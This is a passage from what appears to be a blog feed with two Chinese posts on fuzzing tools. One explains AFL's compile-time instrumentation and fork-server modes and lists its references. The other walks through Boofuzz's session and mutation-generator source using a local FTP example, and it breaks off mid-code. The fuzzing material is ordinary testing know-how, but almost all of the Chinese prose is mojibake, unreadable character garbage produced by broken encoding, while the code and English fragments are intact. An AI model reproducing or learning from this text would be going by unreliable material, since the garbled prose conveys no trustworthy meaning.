onerror="this.parent.classList.add('github-emoji-fallback')"></span> éå†æ‰€æœ‰åŸºæœ¬å—BBï¼š</p><ul><li>éšæœºç”Ÿæˆä¸€ä¸ªåŸºæœ¬å—IDå€¼<code>cur_loc</code></li><li>è½½å…¥å…¨å±€å˜é‡<code>__afl_prev_loc</code></li><li>è½½å…¥å…¨å±€å…±äº«å†…å­˜åŒºåŸŸæŒ‡é’ˆ<code>__afl_area_ptr</code>ï¼Œè®¡ç®—å€¼<code>cur_loc xor __afl_prev_loc</code></li><li>æ›´æ–°æ¯”ç‰¹ä½å›¾ï¼šå°†ä¸Šè¿°è®¡ç®—å€¼ä½œä¸ºç´¢å¼•ï¼Œåœ¨<code>__afl_area_ptr</code>ä¸­å¯»å€ï¼Œè®©å¯¹åº”çš„å­—èŠ‚å€¼+1</li><li>æ›´æ–°<code>__afl_prev_loc</code>çš„å€¼ï¼š<code>__afl_prev_loc = cur_loc &gt;&gt; 1</code></li></ul></li><li><p><code>registerAFLPass</code>ç”¨æ¥æ³¨å†Œè¯¥<strong>AFLCoverage Pass</strong>ç±»</p></li></ul><h4 id="3-afl-llvm-rt-o-c"><a href="#3-afl-llvm-rt-o-c" class="headerlink" title="3. afl-llvm-rt.o.c"></a>3. afl-llvm-rt.o.c</h4><ul><li><p>è¯¥æ–‡ä»¶çš„ä¸»è¦ä½œç”¨æœ‰ï¼š</p><p><span class="github-emoji"><span>1âƒ£</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0031-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> åœ¨è¢«æµ‹ç›®æ ‡ç¨‹åºæ‰§è¡Œä¹‹å‰è°ƒç”¨<code>__afl_auto_init()</code>åˆå§‹åŒ–å‡½æ•°ï¼š</p><ul><li>ä½¿ç”¨<code>__attribute__((constructor(CONST_PRIO)))</code>å…³é”®å­—ï¼Œè®©è¯¥å‡½æ•°åœ¨è¢«æµ‹ç›®æ ‡ç¨‹åºè°ƒç”¨<code>main()</code>å‡½æ•°ä¹‹å‰æ‰§è¡Œ [21]</li><li>è°ƒç”¨<code>__afl_manual_init()</code>å‡½æ•°ï¼š<ul><li><code>__afl_map_shm()</code>å‡½æ•°ç”¨æ¥è·å–å…±äº«å†…å­˜åŒºåŸŸåœ°å€</li><li><code>__afl_start_forkserver()</code>å‡½æ•°ç”¨æ¥å¯åŠ¨<code>fork-server</code>ï¼Œå…¶æ•´ä½“é€»è¾‘ä¸<a href="#pic13">å›¾13</a>ä¸€æ ·ï¼Œæ­¤å¤„ä¸å†èµ˜è¿°ã€æ³¨ï¼šè¿™é‡Œæ˜¯æ­»å¾ªç¯ï¼Œç”¨æ¥<code>fork</code>å­è¿›ç¨‹ã€‘</li></ul></li></ul><p><span class="github-emoji"><span>2âƒ£</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0032-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> <strong>Persistent mode</strong></p><ul><li><p>åœ¨æºæ–‡ä»¶ä¸­è®¾ç½®<code>__AFL_LOOP(int)</code>åå¯ç”¨</p></li><li><p>å¦‚å‰æ‰€è¿°ï¼Œ<code>afl-clang-fast</code>åœ¨ç¼–è¯‘ç›®æ ‡ç¨‹åºæ—¶ï¼Œä¼šä½¿ç”¨<code>-D</code>é€‰é¡¹å¼•å…¥ä¸€ä¸ª<code>#define __AFL_LOOP(_A)</code>çš„å®å®šä¹‰ï¼Œè¯¥å®å®šä¹‰ä¼šå°†æºä»£ç ä¸­çš„<code>__AFL_LOOP(int)</code>æ›¿æ¢ä¸º<code>__afl_persistent_loop(int)</code>ã€é€šå¸¸<code>__AFL_LOOP()</code>ä¸<code>while()</code>ç»“åˆä½¿ç”¨ã€‘</p></li><li><p><code>int __afl_persistent_loop(unsigned int max_cnt)</code>ï¼š</p><ul><li>åœ¨ç¬¬ä¸€æ¬¡è°ƒç”¨è¯¥å‡½æ•°æ—¶ï¼Œè¯¥å‡½æ•°ä¼šæ¸…ç©º<code>__afl_area_ptr</code>çš„å€¼ï¼Œå³æ¸…ç©ºè¦†ç›–ç‡è·Ÿè¸ªä½å›¾ä¿¡æ¯ï¼ˆåœ¨è¾¾åˆ°<code>__AFL_LOOP()</code>ä¹‹å‰çš„æ‰€æœ‰è¦†ç›–ç‡ä¿¡æ¯éƒ½å°†è¢«æ¸…ç©ºï¼‰ï¼Œç„¶åå°†<code>__afl_area_ptr[0]</code>ç½®ä¸º1ï¼Œ<code>__afl_prev_loc</code>ç½®ä¸º0</li><li>åœ¨éç¬¬ä¸€æ¬¡è°ƒç”¨è¯¥å‡½æ•°æ—¶ï¼ˆå¦‚ä¸<code>while()</code>å¾ªç¯ä¸€èµ·ä½¿ç”¨æ—¶ï¼‰ï¼Œè¯´æ˜å‰ä¸€è½®çš„è¦†ç›–ç‡ä¿¡æ¯å·²ç»ç»Ÿè®¡å®Œæˆï¼Œåœ¨è½®æ•°ä¸ä¸º0çš„æƒ…å†µä¸‹ï¼Œé¦–å…ˆ<code>raise(SIGSTOP)</code>ï¼Œè¡¨ç¤ºç¨‹åºæš‚åœï¼Œç„¶å<code>fork-server</code>çš„<code>waitpid</code>å°†ç›´æ¥è¿”å›ï¼Œç¨‹åºä»åœ¨è¿è¡Œä¸­ï¼Œç„¶åè¯¥è¦†ç›–ç‡ä¿¡æ¯å°†è¢«AFLå¤„ç†ï¼ŒåŒæ—¶ç”Ÿæˆä¸‹ä¸€ä¸ªæµ‹è¯•ç”¨ä¾‹æŠ•å–‚ç»™ç›®æ ‡ç¨‹åº</li><li><code>fork-server</code>å†æ¥æ”¶åˆ°AFLç”Ÿæˆäº†æ–°çš„æµ‹è¯•ç”¨ä¾‹å¹¶éœ€è¦è¿è¡Œç›®æ ‡ç¨‹åºçš„æ¶ˆæ¯ä¹‹åï¼Œç”±äºå…ˆå‰çš„ç¨‹åºå¤„äºæš‚åœçŠ¶æ€ï¼Œ<code>fork-server</code>å°†ä¸ä¼š<code>fork()</code>ä¸€ä¸ªæ–°çš„å­è¿›ç¨‹ï¼Œè€Œæ˜¯å‘ä¹‹å‰æš‚åœçš„å­è¿›ç¨‹å‘é€<code>SIGCONT</code>ï¼ˆç»§ç»­è¿è¡Œï¼‰çš„ä¿¡å·ï¼Œç„¶ååˆå›åˆ°ä¸Šä¸€æ­¥çš„å¾ªç¯ä¸­ï¼Œç›´åˆ°å¾ªç¯æ¬¡æ•°ç»“æŸ</li><li>å¾ªç¯æ¬¡æ•°ç»“æŸåï¼Œ<code>__afl_area_ptr</code>ä¼šé‡å®šå‘åˆ°ä¸€ä¸ªè™šå‡çš„ä½å›¾<code>__afl_area_initial</code>ä¸­ï¼Œé¿å…æ”¶é›†<code>__AFL_LOOP()</code>åé¢æ‰§è¡Œçš„ä»£ç è¦†ç›–ç‡</li></ul></li><li><p>ä»£ç ï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">while</span>(__AFL_LOOP(<span class="hljs-number">1000</span>)) {<br>   <span class="hljs-comment">// AFLåªä¼šç»Ÿè®¡è¯¥å¾ªç¯ä¸­çš„ä»£ç è¦†ç›–ç‡</span><br>    <span class="hljs-comment">// ä¼˜ç‚¹ï¼šé€Ÿåº¦å¿«ï¼Œé¿å…é¢‘ç¹çš„è°ƒç”¨ç¨‹åºçš„åˆå§‹åŒ–æ“ä½œï¼›</span><br>    <span class="hljs-comment">//      èƒ½å¤Ÿé€šè¿‡ä¸€å®šæ•°é‡è¾“å…¥çš„æŠ•å–‚ä½¿å¾—ç¨‹åºåˆ°è¾¾æŸä¸€çŠ¶æ€ï¼Œå› æ­¤å¯ä»¥è¦†ç›–åˆ°æ›´æ·±å±‚æ¬¡çš„ä»£ç ï¼ˆè¿™å¯¹äºç½‘ç»œç¨‹åºæ¥è¯´å…·æœ‰å¥‡æ•ˆï¼‰</span><br>}<br></code></pre></td></tr></tbody></table></figure></li><li><p>æµç¨‹å›¾ï¼š</p><p><img src="/2022/12/27/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%89%96%E6%9E%90AFL%E6%8F%92%E6%A1%A9/14.png"></p><center>å›¾14 persistent modeæµç¨‹å›¾</center></li></ul><p><span class="github-emoji"><span>3âƒ£</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0033-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> <strong>Deferred forkserveræ¨¡å¼</strong>ï¼š</p><ul><li><p>ç”±ç¯å¢ƒå˜é‡<code>__AFL_DEFER_FORKSRV</code>æ§åˆ¶ï¼Œç”¨äºæ§åˆ¶åœ¨ä½•æ—¶å¯åŠ¨forkserverï¼Œé¿å…ä¸€äº›é•¿æ—¶é—´çš„åˆå§‹åŒ–æ“ä½œå½±å“ååé‡</p></li><li><pre><code class="c">__AFL_INIT(); // the forkserver will be raised here!// do something ...</code></pre></li></ul><p><span class="github-emoji"><span>4âƒ£</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0034-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> <strong>trace_pc_guardæ¨¡å¼</strong>ï¼š</p><ul><li><p>trace_pc_guardæ¨¡å¼å¯¹æ‰€æœ‰çš„è¾¹è¿›è¡Œæ’æ¡©ï¼Œæ’æ¡©å€¼ä¸ºguard</p></li><li><p><code>__sanitizer_cov_trace_pc_guard_init(start, stop)</code>ï¼š</p><ul><li>æ›¿æ¢æ¯ä¸ª<code>trace_pc</code>å¤„çš„<code>guard</code>å€¼ï¼ˆéšæœºæ•°ï¼‰ï¼Œä¸è¿›è¡Œæ’æ¡©çš„<code>guard</code>å€¼è®¾ç½®ä¸º0</li></ul></li><li><p><code>__sanitizer_cov_trace_pc_guard(guard)</code>ï¼š</p><ul><li>æ›´æ–°å…±äº«å†…å­˜æ•°æ®ï¼šå¯¹æ¯”ç‰¹ä½å›¾ä¸­ç´¢å¼•ä¸º<code>guard</code>çš„å­—èŠ‚+1</li></ul></li></ul><p>trace_pc_guardç¼–è¯‘è¿‡ç¨‹ä¸­é‡åˆ°çš„é—®é¢˜ï¼š</p><ol><li><p>makefile ä¸­å®šä¹‰ <code>AFL_TRACE_PC = 1</code></p></li><li><p>å¦‚æœè¾“å‡ºå¦‚ä¸‹æ˜¾ç¤ºï¼Œåˆ™å°†afl-clang-fast.c çš„ç¬¬133è¡Œæ›¿æ¢ä¸ºï¼š<code>c_params[cc_par_cnt++] = "-sanitizer-coverage-level=0";</code> </p><blockquote><p>clang (LLVM option parsing): Unknown command line argument â€˜-sanitizer-coverage-block-threshold=0â€™.  Try: â€˜clang (LLVM option parsing) -helpâ€™<br>clang (LLVM option parsing): Did you mean â€˜-sanitizer-coverage-pc-table=0â€™?</p></blockquote></li></ol></li></ul><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a><strong>Reference</strong></h2><ol><li><p><a href="https://en.wikibooks.org/wiki/GNU_C_Compiler_Internals/Print_version">GNU C ç¼–è¯‘å™¨å†…éƒ¨/æ‰“å°ç‰ˆ - ç»´åŸºæ•™ç§‘ä¹¦ï¼Œå¼€æ”¾ä¸–ç•Œçš„å¼€æ”¾ä¹¦ç± (wikibooks.org)</a></p></li><li><p><a href="https://stackoverflow.com/questions/34502255/ast-from-c-code-with-preprocessor-directives">gcc - AST from c code with preprocessor directives - Stack Overflow</a></p></li><li><p><a href="https://stackoverflow.com/questions/15800230/how-can-i-dump-an-abstract-syntax-tree-generated-by-gcc-into-a-dot-file">graphviz - How can I dump an abstract syntax tree generated by gcc into a .dot file? - Stack Overflow</a></p></li><li><p><a href="https://gcc.gnu.org/onlinedocs/gccint/GIMPLE.html">GIMPLE (GNU Compiler Collection (GCC) Internals)</a></p></li><li><p><a href="https://wiki.aalto.fi/pages/viewpage.action?pageId=55374641">GCC GENERIC - Advanced course on compilers - Aalto University Wiki</a></p></li><li><p><a href="https://blog.csdn.net/qq_36287943/article/details/105458166">GCC - GIMPLE IR å­¦ä¹ ä¸€_zhugl0çš„åšå®¢-CSDNåšå®¢_gimple</a></p></li><li><p><a href="https://wiki.aalto.fi/pages/viewpage.action?pageId=55375140">GCC RTL - Advanced course on compilers - Aalto University Wiki</a></p></li><li><p><a href="https://www.cs.nmsu.edu/~rth/cs/cs271/notes/Compiling.html">CS271: Compiling (nmsu.edu)</a></p></li><li><p><a href="https://getting-started-with-llvm-core-libraries-zh-cn.readthedocs.io/zh_CN/latest/ch04.html">ç¬¬4ç«  å‰ç«¯ â€” Getting Started with LLVM Core Libraries æ–‡æ¡£ (getting-started-with-llvm-core-libraries-zh-cn.readthedocs.io)</a></p></li><li><p><a href="https://stackoverflow.com/questions/14163208/how-to-link-c-object-files-with-ld">linker - How to link C++ object files with ld - Stack Overflow</a></p></li><li><p><a href="https://getting-started-with-llvm-core-libraries-zh-cn.readthedocs.io/zh_CN/latest/ch05.html">ç¬¬5ç«  LLVMä¸­é—´è¡¨ç¤º â€” Getting Started with LLVM Core Libraries æ–‡æ¡£ (getting-started-with-llvm-core-libraries-zh-cn.readthedocs.io)</a></p></li><li><p><a href="https://getting-started-with-llvm-core-libraries-zh-cn.readthedocs.io/zh_CN/latest/ch06.html">ç¬¬6ç«  åç«¯ â€” Getting Started with LLVM Core Libraries æ–‡æ¡£ (getting-started-with-llvm-core-libraries-zh-cn.readthedocs.io)</a></p></li><li><p><a href="https://discourse.llvm.org/t/llc-view-dag-combine1-dags/1876/5">LLC -view-dag-combine1-dags - Beginners - LLVM Discussion Forums</a></p></li><li><p><a href="https://blog.csdn.net/weixin_46222091/article/details/104414187">æŒ‡ä»¤è°ƒåº¦æ¦‚å¿µåŸç†ä»‹ç»_ronnie88597çš„åšå®¢-CSDNåšå®¢</a></p></li><li><p><a href="https://mudongliang.github.io/2016/05/24/stack-protector.html">GCC Stack Protector options (mudongliang.github.io)</a></p></li><li><p><a href="https://stackoverflow.com/questions/24787769/what-are-lfb-lbb-lbe-lvl-loc-in-the-compiler-generated-assembly-code">c - What are .LFB .LBB .LBE .LVL .loc in the compiler generated assembly code - Stack Overflow</a></p></li><li><p><a href="https://sourceware.org/binutils/docs-2.18/as/LNS-directives.html#LNS-directives">LNS directives - Using as (sourceware.org)</a></p></li><li><p><a href="https://sourceware.org/binutils/docs-2.18/as/Symbol-Names.html">Symbol Names - Using as (sourceware.org)</a></p></li><li><p><a href="https://github.com/gcc-mirror/gcc/blob/master/gcc/dwarf2out.cc">gcc/gcc at master Â· gcc-mirror/gcc (github.com)</a></p></li><li><p><a href="https://clang.llvm.org/docs/genindex.html">Index â€” Clang 16.0.0git documentation (llvm.org)</a></p></li><li><p><a href="https://gcc.gnu.org/onlinedocs/gcc-6.2.0/gcc/Common-Function-Attributes.html">Common Function Attributes - Using the GNU Compiler Collection (GCC)</a></p></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>æ¨¡ç³Šæµ‹è¯•</tag>
      
      <tag>AFL</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Boofuzzæºç è§£æ</title>
    <link href="/2022/09/27/Boofuzz%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90/"/>
    <url>/2022/09/27/Boofuzz%E6%BA%90%E7%A0%81%E8%A7%A3%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="boofuzzæºç åˆ†æ"><a href="#boofuzzæºç åˆ†æ" class="headerlink" title="boofuzzæºç åˆ†æ"></a>boofuzzæºç åˆ†æ</h1><p>ä»¥<code>ftp_simple.py</code>ä¸ºä¾‹ï¼š</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">session = Session(target=Target(connection=TCPSocketConnection(<span class="hljs-string">"127.0.0.1"</span>, <span class="hljs-number">21</span>)))  <span class="hljs-comment"># åˆ›å»ºsession</span><br><br>define_proto(session=session)  <span class="hljs-comment"># å®šä¹‰proto</span><br><br>session.fuzz()<span class="hljs-comment"># å¼€å§‹æ¨¡ç³Šæµ‹è¯•</span><br></code></pre></td></tr></tbody></table></figure><p>å…¶ä¸­ï¼Œ<code>define_proto()</code> å°†è°ƒç”¨<code>session.connect()</code>æ„é€ è°ƒç”¨æµå›¾ã€‚å¦‚æœ<code>connect(node1)</code>çš„å‚æ•°åªæœ‰åªæœ‰ä¸€ä¸ªï¼Œé‚£ä¹ˆè¯¥èŠ‚ç‚¹å°†ä¿å­˜åœ¨<code>self.nodes</code>å˜é‡ä¸­ï¼ŒåŒæ—¶ä¼šåˆ›å»º<code>self.root</code>åˆ°è¯¥èŠ‚ç‚¹çš„è¾¹ï¼›å¦‚æœ<code>connect(node1, node2)</code>ï¼Œnode1å’Œnode2èŠ‚ç‚¹ä¿¡æ¯éƒ½å°†ä¿å­˜åœ¨<code>self.nodes</code>å˜é‡ä¸­ï¼ŒåŒæ—¶ä¼šåˆ›å»ºnode1åˆ°node2çš„è¾¹</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">session.connect(user)<br>   session.connect(user, passw)<br>   session.connect(passw, stor)<br>   session.connect(passw, retr)<br></code></pre></td></tr></tbody></table></figure><p><code>session.fuzz()</code>æ ¸å¿ƒä»£ç åœ¨<code>_main_fuzz_loop</code>ä¸­</p><p>åœ¨<code>_main_fuzz_loop</code>ä¸­ï¼š</p><p><code>self.server_init()</code>ï¼šå¯åŠ¨<code>web_interface_thread</code>ï¼ˆç½‘ç»œæ¥å£çº¿ç¨‹ï¼šé»˜è®¤ä¸ºlocalhost:26000ï¼‰</p><p><code>self._start_target()</code>ï¼šå¯åŠ¨ä¸€ä¸ªboofuzz.sessions.Targetå®ä¾‹</p><p>ç›¸å…³å˜é‡</p><table><thead><tr><th>å˜é‡å</th><th>å«ä¹‰</th></tr></thead><tbody><tr><td>self.num_cases_actually_fuzzed</td><td>å®é™…fuzzçš„æµ‹è¯•ç”¨ä¾‹æ•°</td></tr><tr><td>mutation_context</td><td>å˜å¼‚ä¸Šä¸‹æ–‡</td></tr><tr><td>fuzz_case_iterator</td><td>fuzzæµ‹è¯•ç”¨ä¾‹è¿­ä»£å™¨</td></tr></tbody></table><p>éå†<code>fuzz_case_iterator</code>ä¸­çš„<code>mutation_context</code>ï¼Œ</p><ul><li><p>å¦‚æœè®¾ç½®äº†<code>restart_interval</code>ï¼Œè¡¨æ˜æ¯æ¬¡è¿è¡Œ<code>restart_interval</code>ä¸ªæµ‹è¯•ç”¨ä¾‹åé‡å¯target</p></li><li><p><code>_fuzz_current_case()</code>å‡½æ•°å¯¹å½“å‰çš„æµ‹è¯•ç”¨ä¾‹è¿›è¡Œæ¨¡ç³Šæµ‹è¯•ï¼Œè€Œè¯¥æµ‹è¯•ç”¨ä¾‹ç”±<code>fuzz_case_iterator</code>æ§åˆ¶ï¼š</p><ul><li><p><code>_pause_if_pause_flag_is_set()</code>å‡½æ•°<code>pause flag</code>æ˜¯å¦è¢«å”¤èµ·ï¼Œå¦‚æœè¢«å”¤èµ·ï¼Œåˆ™è¿›å…¥ä¸€ä¸ªæ— é™å¾ªç¯ä¸­ç­‰å¾…å…¶å˜ä¸ºFalseï¼ˆWhyï¼Ÿï¼‰</p></li><li><p><code>self._test_case_name()</code>å‡½æ•°ç”¨äºæ„é€ æµ‹è¯•ç”¨ä¾‹åï¼Œæµ‹è¯•ç”¨ä¾‹åå­—æ ¼å¼ä¸ºï¼š<code>message_path:[qualified_name1:mutation.index1,  qualified_name2:mutation.index2, ...]</code>ï¼Œä¾‹å¦‚<code>user:[user.key:0]</code></p></li><li><p><code>self._fuzz_data_logger.open_test_case()</code>è®°å½•æµ‹è¯•ç”¨ä¾‹ï¼Œé»˜è®¤æ˜¯è®²ä¿å­˜æ’å…¥æµ‹è¯•ç”¨ä¾‹ä¿¡æ¯çš„sqlè¯­å¥æ·»åŠ åˆ°<code>self._queue</code>é˜Ÿåˆ—ä¸­ã€‚ï¼ˆåœ¨ä½•å¤„æ‰§è¡Œï¼Ÿåœ¨<a href="#logger_close">æ­¤å¤„</a>æ‰§è¡Œï¼‰</p></li><li><p><code>self._open_connection_keep_trying()</code>å°è¯•ä¸æœåŠ¡å™¨è¿›è¡Œè¿æ¥ï¼ˆå»ºç«‹<strong>å¥—æ¥å­—</strong>å¹¶<strong>è¿æ¥</strong>ï¼‰ï¼Œå¦‚æœæ˜¯å› ä¸ºå¯ç”¨å¥—æ¥å­—æ•°ä¸å¤Ÿå¯¼è‡´çš„é”™è¯¯ï¼Œé‚£å°±å†è¿›è¡Œ50è½®*5sçš„åˆ¤æ–­ã€å¦‚æœåœ¨è¿™æ®µæ—¶é—´å†…æœ‰å¯ä»¥åˆ›å»ºå¥—æ¥å­—ï¼Œåˆ™ç»§ç»­è¿›è¡Œï¼Œå¦åˆ™å°†æŠ¥é”™ã€‘ã€‚</p></li><li><p><code>self._pre_send(target)</code>ï¼šä¸çŸ¥é“å¹²å•¥çš„</p></li><li><p><code>self.transmit_fuzz()</code>ï¼š</p><ul><li><code>self.fuzz_node.render()</code>ï¼šæ¸²æŸ“æ¨¡ç³Šæµ‹è¯•èŠ‚ç‚¹æ•°æ®</li><li>æ¸²æŸ“å®Œæˆåï¼Œç”±self.targets[0]æ¥<strong>å‘é€</strong>è¯¥æ•°æ®</li><li>å¦‚æœ<code>self._receive_data_after_fuzz</code>ä¸º<code>True</code>ï¼Œåˆ™å°†è¿”å›çš„ä¿¡æ¯ä¿å­˜åˆ°receivedå˜é‡ä¸­</li></ul></li><li><p><code>self._check_for_passively_detected_failures()</code>ï¼šè¢«åŠ¨æ£€æŸ¥é”™è¯¯ã€‚é¦–å…ˆï¼Œéœ€è¦éå†<code>target.monitors</code>è¯¥æ•°ç»„ä¸¤éï¼Œç¬¬ä¸€éæ£€æŸ¥æ‰€æœ‰çš„monitorï¼Œåˆ¤æ–­å…¶æ˜¯å¦æŠ¥å‘Šä¸€ä¸ªé”™è¯¯ï¼Œå¦‚æœæŠ¥å‘Šäº†é”™è¯¯ï¼Œé‚£ä¹ˆéœ€è¦æ”¶é›†ä¸€ä¸ªå´©æºƒä¿¡æ¯ã€ä¸ç¡®å®šæ˜¯å¦monitorä¸€å®šä¼šæä¾›ä¸€ä¸ªå´©æºƒä¿¡æ¯ï¼Œä½†ä»¥é˜²ä¸‡ä¸€è¿˜æ˜¯è¦æ£€æŸ¥ä¸€ä¸‹ã€‘ï¼›åœ¨ç¬¬äºŒéï¼Œæˆ‘ä»¬å°è¯•ä»æœªæ£€æµ‹åˆ°å´©æºƒçš„ç›‘è§†å™¨ä¸­è·å–å´©æºƒæ¦‚è¦ä½œä¸ºè¡¥å……ä¿¡æ¯ã€‚å¦‚æœæœªæ£€æµ‹åˆ°é”™è¯¯ï¼Œåˆ™è¾“å‡ºâ€No crash detected.â€ï¼Œå¹¶è¿”å›æ˜¯å¦å´©æºƒçš„æ ‡å¿—</p></li><li><p>å¦‚æœ<code>self._reuse_target_connection</code>ï¼ˆé‡ç”¨ç›®æ ‡è¿æ¥ï¼‰ä¸ºå‡ï¼Œé‚£ä¹ˆç›´æ¥å…³é—­è¿æ¥</p></li><li><p>æœ€åè¿›è¡Œä¸‰ä¸ªæ“ä½œï¼š<code>self._process_failures()</code>ã€å¤„ç†é”™è¯¯ã€‘ã€<span id="logger_close"><code>self._fuzz_data_logger.close_test_case()</code></span>ã€å°†æ—¥å¿—å†™åˆ°æ•°æ®åº“ä¸­ã€‘å’Œ<code>self.export_file()</code>ã€å°†å¯¹è±¡å€¼å¯¼å‡ºåˆ°æœ¬åœ°ç£ç›˜/éœ€è¦è®¾ç½®<code>self.session_filename</code>ã€‘</p></li></ul></li></ul><hr><p>è¯¦è§£<code>fuzz_case_iterator</code>ï¼š</p><ul><li>æœ€å…ˆä¼ å…¥çš„æ˜¯<code>self._generate_mutations_indefinitely(max_depth=max_depth)</code> ã€é»˜è®¤ max_depth ä¸º <strong>None</strong> ã€‘</li></ul><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">_generate_mutations_indefinitely</span>(<span class="hljs-params">self, max_depth=<span class="hljs-literal">None</span>, path=<span class="hljs-literal">None</span></span>):<br>    <span class="hljs-string">"""Yield MutationContext with n mutations per message over all messages, with n increasing indefinitely."""</span><br>    depth = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> max_depth <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">or</span> depth &lt;= max_depth:  <span class="hljs-comment"># å½“max_depthä¸ºNoneæ—¶ï¼Œè¿™é‡Œæ˜¯ä¸€ä¸ªæ— é™å¾ªç¯</span><br>        valid_case_found_at_this_depth = <span class="hljs-literal">False</span>  <span class="hljs-comment"># ä¸€ä¸ªæ ‡å¿—ä½ï¼Œè¡¨ç¤ºæ˜¯å¦åœ¨è¯¥æ·±åº¦æ‰¾åˆ°åˆæ³•çš„æµ‹è¯•ç”¨ä¾‹</span><br>        <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> self._generate_n_mutations(depth=depth, path=path): <span class="hljs-comment"># è°ƒç”¨_generate_n_mutations()ç”Ÿæˆå¯è¿­ä»£æ•°æ®</span><br>            valid_case_found_at_this_depth = <span class="hljs-literal">True</span> <span class="hljs-comment"># å°†æ˜¯å¦åœ¨è¯¥æ·±åº¦æ‰¾åˆ°åˆæ³•çš„æµ‹è¯•ç”¨ä¾‹çš„æ ‡å¿—ä½è®¾ç½®ä¸º1</span><br>            <span class="hljs-keyword">yield</span> m  <span class="hljs-comment"># ç”Ÿæˆå™¨è¿”å›m</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> valid_case_found_at_this_depth: <span class="hljs-comment"># è¡¨ç¤ºè¯¥å±‚æ²¡æœ‰ç”Ÿæˆä»»ä½•æœ‰æ•ˆæ•°æ®ï¼Œåˆ™é€€å‡ºå¾ªç¯</span><br>            <span class="hljs-keyword">break</span><br>        depth += <span class="hljs-number">1</span> <span class="hljs-comment"># æ·±åº¦++</span><br></code></pre></td></tr></tbody></table></figure><ul><li>æ¥ç€å°±æ˜¯åˆ†æå†…å±‚ç”Ÿæˆå™¨ï¼Œi.e. <code>self._generate_n_mutations(depth=depth, path=path)</code>ï¼š</li></ul><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">_generate_n_mutations</span>(<span class="hljs-params">self, depth, path</span>):<br>    <span class="hljs-string">"""Yield MutationContext with n mutations per message over all messages."""</span><br>    <span class="hljs-keyword">for</span> path <span class="hljs-keyword">in</span> self._iterate_protocol_message_paths(path=path):  <span class="hljs-comment"># éå†pathï¼ˆæ¶ˆæ¯ï¼‰</span><br>        <span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> self._generate_n_mutations_for_path(path, depth=depth): <span class="hljs-comment"># ä¸ºæ¯ä¸€ä¸ªæ¶ˆæ¯è¿›è¡Œnæ¬¡å˜å¼‚</span><br>            <span class="hljs-keyword">yield</span> m<br></code></pre></td></tr></tbody></table></figure><p><span class="github-emoji"><span>1âƒ£</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/0031-20e3.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> <code>self._iterate_protocol_message_paths(path=path)</code>ï¼š</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">_iterate_protocol_message_paths</span>(<span class="hljs-params">self, path=<span class="hljs-literal">None</span></span>):<br>    <span class="hljs-string">"""</span><br><span class="hljs-string">    Iterates over protocol and yields a path (list of Connection) leading to a given message).</span><br><span class="hljs-string"></span><br><span class="hljs-string">    Args:</span><br><span class="hljs-string">        path (list of Connection): Provide a specific path to yield only that specific path.</span><br><span class="hljs-string"></span><br><span class="hljs-string">    Yields:</span><br><span class="hljs-string">        list of Connection: List of edges along the path to the current one being fuzzed.</span><br><span class="hljs-string"></span><br><span class="hljs-string">    Raises:</span><br><span class="hljs-string">        exception.SulleyRuntimeError: If no requests defined or no targets specified</span><br><span class="hljs-string">    """</span><br>    <span class="hljs-comment"># we can't fuzz if we don't have at least one target and one request.</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.targets:<br>        <span 